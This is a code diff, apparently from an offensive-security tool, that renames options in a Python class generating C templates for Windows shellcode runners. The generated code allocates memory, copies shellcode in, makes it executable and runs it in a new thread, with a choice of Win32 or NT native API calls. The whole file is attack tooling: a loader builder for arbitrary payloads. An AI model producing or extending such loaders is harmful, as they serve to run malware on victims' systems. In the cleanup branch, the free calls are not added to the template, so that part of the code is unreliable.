@@ -8,20 +8,20 @@ class shellcoderunner:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
 
-        self.allocation = 'VirtualAlloc'
-        if 'allocation' in arguments:
-            if arguments['allocation'] in ['VirtualAlloc', 'HeapAlloc', 'VirtualAllocEx', 'NtAllocateVirtualMemory']:
-                self.allocation = arguments['allocation']
+        self.allocate = 'VirtualAlloc'
+        if 'allocate' in arguments:
+            if arguments['allocate'] in ['VirtualAlloc', 'HeapAlloc', 'VirtualAllocEx', 'NtAllocateVirtualMemory']:
+                self.allocate = arguments['allocate']
             else:
-                print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
+                print('Allocate argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                 exit(0)
 
-        self.execution = 'CreateThread'
-        if 'execution' in arguments:
-            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
-                self.execution = arguments['execution']
+        self.execute = 'CreateThread'
+        if 'execute' in arguments:
+            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx']:
+                self.execute = arguments['execute']
             else:
-                print('Execution argument must be CreateThread or NtCreateThreadEx')
+                print('Execute argument must be CreateThread or NtCreateThreadEx')
                 exit(0)
 
         self.copy = 'memcpy'
@@ -73,13 +73,13 @@ class shellcoderunner:
     def template(self) -> str:
         template = '{transformers}'
 
-        if self.allocation == 'VirtualAlloc':
+        if self.allocate == 'VirtualAlloc':
             template += VirtualAlloc('buffer', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
-        elif self.allocation == 'HeapAlloc':
+        elif self.allocate == 'HeapAlloc':
             template += HeapAlloc('buffer', 'HEAP_ZERO_MEMORY', '{shellcodeSize}')
-        elif self.allocation == 'NtAllocateVirtualMemory':
+        elif self.allocate == 'NtAllocateVirtualMemory':
             template += NtAllocateVirtualMemory('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
-        elif self.allocation == 'VirtualAllocEx':
+        elif self.allocate == 'VirtualAllocEx':
             template += VirtualAllocEx('buffer', '(HANDLE)-1', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
 
         if self.copy == 'memcpy':
@@ -94,9 +94,9 @@ class shellcoderunner:
         elif self.protect == 'NtProtectVirtualMemory':
             template += NtProtectVirtualMemory('(HANDLE)-1', 'buffer', '{shellcodeSize}', self.memoryPermission)
 
-        if self.execution == 'CreateThread':
+        if self.execute == 'CreateThread':
             template += CreateThread('hThread', 'buffer')
-        elif self.execution == 'NtCreateThreadEx':
+        elif self.execute == 'NtCreateThreadEx':
             template += NtCreateThreadEx('hThread', '(HANDLE)-1', 'buffer')
 
         if self.wait == 'WaitForSingleObject':
@@ -109,11 +109,11 @@ class shellcoderunner:
         elif self.close == 'NtClose':
             template += NtClose('hThread')
 
-        if self.allocation == 'VirtualAlloc':
+        if self.allocate == 'VirtualAlloc':
             VirtualFree('buffer')
-        elif self.allocation == 'HeapAlloc':
+        elif self.allocate == 'HeapAlloc':
             HeapFree('hHeap', 'buffer')
-        elif self.allocation == 'NtAllocateVirtualMemory':
+        elif self.allocate == 'NtAllocateVirtualMemory':
             NtFreeVirtualMemory('(HANDLE)-1', 'buffer')
 
         return template
